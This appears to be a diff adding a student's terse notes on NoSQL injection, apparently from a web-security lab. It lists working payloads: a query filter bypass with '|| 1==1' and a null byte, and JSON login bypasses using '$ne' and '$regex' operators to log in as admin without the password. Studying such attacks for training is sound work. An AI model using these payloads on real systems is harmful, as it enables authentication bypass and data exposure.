@@ -1,0 +1,40 @@
+it comes as json
+example
+db.find{id:1}
+'{} (try them for nosql)
+use these and in nosql (&& released=1)
+catagory=accessories && released=1
+comment ( %00 )
+
+mongo and casandra and firebase uses nosql not sql
+
+1==1 in nosql
+
+catagory=accessories' || 1%00
+or catagory=accessories' || 1==1%00
+
+{
+"username":"wiener",
+"password":"peter"
+}
+betsir
+{
+"username":"wiener",
+"password":{
+"$ne":"ridox"
+}
+}
+
+
+{ 
+"username":{
+"$regex":"ad"    (pattern for admin)
+},
+"password":{      
+"$ne":"ridox"
+}
+}  
+
+
+
+
